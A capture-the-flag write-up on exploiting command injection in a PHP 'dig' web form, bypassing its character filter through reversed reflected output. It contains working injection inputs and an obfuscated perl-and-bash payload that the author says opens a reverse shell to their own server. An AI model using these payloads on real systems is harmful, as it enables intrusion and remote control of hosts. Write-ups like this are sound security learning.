## dig host 3 (bonus)
The easy solution to this one is to simply run ``'`{cat,bonus_flag}`'``. However we did not find the easy solution. Here's how you take the long way around...

The challenge offers you a webpage where you can run the program DiG and query some dns record.

![no alt](images/dighost1.png)

The previous 3 challenges have been about command injection, so we tried various command injection. By sending `;ls` we can see which files exist in the directory, we can read files by running `;cat<flag`.

![no alt](images/dighost2.png)

This is how we solved dig host 3, however the bonus_flag file returns nothing when we try to cat it the same way. We can also cat `dig_host_level3.php`. 

```php
<?php
        require_once("../include/smarty.php");


        $host = "";
    $output = "";

        if(isset($_POST) && is_array($_POST) && array_key_exists("host", $_POST)) {
        $host = preg_replace("/[\s\$-]+/", "", $_POST["host"]);

        exec("/dig ".$host, $output);
    }

        $smarty->assign(array(
                "PHP_SELF"      => $_SERVER["PHP_SELF"],
                "host"          => $host,
        "output"    => implode("\n", $output)
        ));

        $smarty->display("dig_host_level3.tpl");
?>

```

Not being able to use whitespace `$` or `-` was pretty limiting, mostly the lack of whitespace would make it impossible to run commands with arguments (we believed). But we did get 1 space for free, the space between `/dig` and whatever we typed in, so we thought about ways to abuse it. 

![no alt](images/dighost3.png)

We noticed that dig reflects the input you give it at the end of the first line. If we give a reversed payload it will reflect it to us, we can then undo the reverse on our payload by using `rev`. Using this method we can inject almost arbitrary strings (specifically `[^\s$-]`) into the beginning of our line. We ran `ls -al /usr/bin` on dig host 1 to see which programs it had that might grant us RCE from this. We tried `python3`, `node`  and `perl`.

Something like 
```python
print(bytes([101,118,105,108,32,115,116,117,102,102]).decode()) >><< utnubU-1.61.9 GiD >><< ;
dmc+ :snoitpo labolg ;;
:rewsna toG ;;
... more garbag here ...
```
would let us generate strings that contain any character, but none of them would accept incomplete multiline comments like `"""` in pythin `/*` in javascript. Single line comments wouldn't help since it parsed the entire file at once. After many hours of trying things that didn't work we tried the following payload.

```
ffuts_live_od|rev>/tmp/bleh;echo`cat</tmp/bleh`
```
This payload echos `ffuts_live_od` using `dig`, then reverse it so `do_evil_stuff` is first on the first line, then writes it to `/tmp/bleh` and then echos `cat</tmp/bleh`, which collapses it into one line.

![no alt](images/dighost4.png)

RCE baby!!!

I wrote a small python script to help generate payloads and after 3 hours of sleep I made this monster. (I'm skipping over the string escaping because it is nuts and boring)
```bash
\\\#\\\)\\\"13x\\\\\\\".\\\"62x\\\\\\\".\\\"e3x\\\\\\\".\\\"03x\\\\\\\".\\\"02x\\\\\\\".\\\"73x\\\\\\\".\\\"33x\\\\\\\".\\\"33x\\\\\\\".\\\"13x\\\\\\\".\\\"f2x\\\\\\\".\\\"83x\\\\\\\".\\\"33x\\\\\\\".\\\"13x\\\\\\\".\\\"e2x\\\\\\\".\\\"33x\\\\\\\".\\\"73x\\\\\\\".\\\"e2x\\\\\\\".\\\"23x\\\\\\\".\\\"23x\\\\\\\".\\\"e2x\\\\\\\".\\\"53x\\\\\\\".\\\"63x\\\\\\\".\\\"13x\\\\\\\".\\\"f2x\\\\\\\".\\\"07x\\\\\\\".\\\"36x\\\\\\\".\\\"47x\\\\\\\".\\\"f2x\\\\\\\".\\\"67x\\\\\\\".\\\"56x\\\\\\\".\\\"46x\\\\\\\".\\\"f2x\\\\\\\".\\\"02x\\\\\\\".\\\"62x\\\\\\\".\\\"e3x\\\\\\\".\\\"02x\\\\\\\".\\\"96x\\\\\\\".\\\"d2x\\\\\\\".\\\"02x\\\\\\\".\\\"86x\\\\\\\".\\\"37x\\\\\\\"\\\(tnirp|rev>/tmp/bleh;echo`cat</tmp/bleh`>/tmp/gamer;perl</tmp/gamer|bash
```
It makes a reverse shell to my DTUHAX's server. The challenge is not done.

![no alt](images/dighost5.png)

We still can't read bonus_flag. Turns out you have to be user 20000, (aka root? I think) and we are not user 20000. Luckily `/dig` is a setuid binary with the right user, and DiG has an option to read domains to query from a file, and it echos those domains!

![no alt](images/dighost6.png)

huh?

![no alt](images/dighost7.png)

works fine locally?

We spent a long time trying to figure this out, eventually we used the rev shell to copy their version of dig and reversed it. The binary checks that `argc == 2`, that some illegal characters aren't in the first argument and then it just runs it bash.

![no alt](images/dighost8.png)

Turns out they have 2 dig binaries (and a symlink)
```
$ find / -name dig 2>/dev/null
/usr/bin/dig
/web-apps/php/html/dig
/dig
```
They don't ban `-` in the fake `dig` binary so running `/dig -fbonus_flag` works fine.

```
$ /dig -fbonus_flag
; <<>> DiG 9.16.1-Ubuntu <<>> flag{wait, i thought this was web!}
```
